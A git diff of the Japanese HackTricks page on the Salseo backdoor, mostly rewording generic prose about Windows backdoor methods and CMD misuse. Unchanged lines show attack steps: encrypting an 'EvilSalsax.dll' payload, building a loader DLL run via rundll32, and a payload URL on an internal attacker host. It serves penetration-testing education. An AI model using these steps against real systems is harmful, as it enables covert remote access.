@@ -6,7 +6,7 @@
 
 * **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
@@ -39,25 +39,25 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-Windows（ウィンドウズ）は、マイクロソフトが開発したオペレーティングシステムです。Windowsには、バックドアを作成するためのさまざまな方法があります。
+Windows（ウィンドウズ）は、最も一般的なオペレーティングシステムの1つであり、多くのバージョンが存在します。Windowsには、バックドアを作成してシステムに不正アクセスするためのさまざまな方法があります。
 
 #### リモートデスクトップ
 
-リモートデスクトップは、Windowsの標準機能であり、リモートでコンピュータにアクセスするための便利な方法です。しかし、この機能は悪意のあるユーザーにとっても便利なツールとなり得ます。攻撃者は、リモートデスクトップを使用してバックドアを作成し、ターゲットマシンにアクセスすることができます。
+リモートデスクトップは、Windowsの標準機能であり、リモートでコンピュータにアクセスするための便利な方法です。しかし、この機能は悪意のある攻撃者にとっても便利な手段となり得ます。攻撃者は、リモートデスクトップを使用してシステムにアクセスし、バックドアを作成することができます。
 
 #### サービス
 
-Windowsでは、サービスと呼ばれるバックグラウンドプロセスを作成することができます。これらのサービスは、システムの起動時に自動的に実行され、バックドアとして機能することができます。攻撃者は、悪意のあるサービスを作成し、ターゲットマシンにバックドアを設置することができます。
+Windowsでは、バックドアを作成するためにサービスを利用することもできます。サービスは、バックグラウンドで実行されるプログラムであり、システムの機能を提供します。攻撃者は、悪意のあるサービスを作成して、システムにバックドアを作り込むことができます。
 
 #### レジストリ
 
-Windowsのレジストリは、システムの設定情報を格納するデータベースです。攻撃者は、レジストリを使用してバックドアを作成し、システムの起動時に自動的に実行されるようにすることができます。これにより、攻撃者はターゲットマシンにアクセスし、制御することができます。
+Windowsのレジストリは、システムの設定情報を格納するデータベースです。攻撃者は、レジストリを悪用してバックドアを作成することができます。例えば、レジストリの特定のキーに悪意のあるプログラムを登録することで、システムにバックドアを作り込むことができます。
 
 #### シェル拡張
 
-Windowsでは、シェル拡張を使用してバックドアを作成することもできます。シェル拡張は、エクスプローラウィンドウの右クリックメニューに追加されるカスタムコマンドです。攻撃者は、シェル拡張を使用してバックドアを作成し、ターゲットマシンにアクセスすることができます。
+Windowsでは、シェル拡張を使用してバックドアを作成することもできます。シェル拡張は、エクスプローラなどのシステムコンポーネントに機能を追加するためのプラグインです。攻撃者は、悪意のあるシェル拡張を作成して、システムにバックドアを作り込むことができます。
 
-これらは、Windowsでバックドアを作成するための一般的な方法のいくつかです。攻撃者はこれらの方法を使用して、ターゲットマシンに不正アクセスすることができます。セキュリティを強化するためには、これらの方法を理解し、適切な対策を講じる必要があります。
+これらは、Windowsでバックドアを作成するための一般的な方法のいくつかです。攻撃者は、これらの方法を悪用してシステムに不正アクセスすることができます。セキュリティを強化するためには、これらの攻撃手法に対する対策を講じる必要があります。
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -111,13 +111,13 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ### メイン関数の前に\[DllExport]を追加します
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png>)
 
 ### このプロジェクトにDllExportをインストールします
 
 #### **ツール** --> **NuGetパッケージマネージャー** --> **ソリューションのNuGetパッケージを管理...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png>)
 
 #### **DllExportパッケージを検索（ブラウズタブを使用）し、インストールボタンを押します（ポップアップを受け入れます）**
 
@@ -157,7 +157,7 @@ Visual Studioを**終了**します
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-ソリューションをビルドするには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）
+ソリューションを**ビルド**するには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）
 
 ### 生成されたDLLをテストします
 
@@ -184,23 +184,11 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
+CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD provides a wide range of commands that can be used to perform various tasks, such as navigating through directories, managing files and folders, running programs, and configuring system settings.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By exploiting vulnerabilities or using social engineering techniques, hackers can gain access to a system and use CMD to perform malicious activities.
+CMD is often used by hackers as a backdoor to gain unauthorized access to a target system. By exploiting vulnerabilities or using social engineering techniques, hackers can execute malicious commands through CMD to compromise the security of the system. This can include activities such as installing malware, stealing sensitive information, or gaining remote control of the system.
 
-Some common CMD commands used by hackers include:
-
-- **netstat**: This command displays active network connections and listening ports on a system. Hackers can use this command to gather information about a target's network and identify potential entry points.
-
-- **ipconfig**: This command displays the IP configuration of a system, including the IP address, subnet mask, and default gateway. Hackers can use this command to gather information about a target's network and identify potential vulnerabilities.
-
-- **tasklist**: This command displays a list of running processes on a system. Hackers can use this command to identify processes that may be vulnerable to exploitation or to gather information about running applications.
-
-- **regedit**: This command opens the Windows Registry Editor, which allows hackers to modify registry keys and values. By modifying registry settings, hackers can gain persistence on a compromised system or disable security features.
-
-- **shutdown**: This command allows hackers to shut down or restart a target system. By executing this command, hackers can disrupt the normal operation of a system or cause denial of service.
-
-It is important to note that the use of CMD for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and to promote responsible and ethical use of technology.
+To protect against CMD-based attacks, it is important to implement strong security measures, such as keeping the operating system and software up to date, using strong passwords, and regularly monitoring system logs for any suspicious activities. Additionally, it is recommended to restrict access to CMD and other command-line tools to only authorized users and to regularly conduct security audits and penetration testing to identify and address any vulnerabilities.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
